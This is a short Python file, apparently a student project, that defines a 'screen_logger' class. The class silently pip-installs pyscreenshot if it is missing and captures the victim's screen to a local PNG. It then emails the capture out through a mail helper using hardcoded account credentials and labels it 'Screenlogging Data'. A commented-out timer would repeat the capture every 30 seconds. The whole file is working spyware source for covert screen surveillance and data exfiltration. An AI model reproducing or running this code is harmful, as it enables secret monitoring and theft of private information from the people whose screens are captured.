try:
    import threading
    import pyscreenshot
    from mail import send_mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    FILENAME = "C:/Users/sudee/ISAA/ScreenOutput.png"
    SEND_REPORT_EVERY = 30
    TYPE = "Screenlogging Data"

    class screen_logger: 
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "System Details"
            self.email = email
            self.password = password

        def save_image(self):
            image = pyscreenshot.grab()
            image.save(FILENAME)

        def report(self):
            self.save_image()
            send_mail(self.email, self.password, FILENAME, TYPE)
            # timer = threading.Timer(self.interval, self.report)
            # timer.start()

        def run(self):
            self.report()

    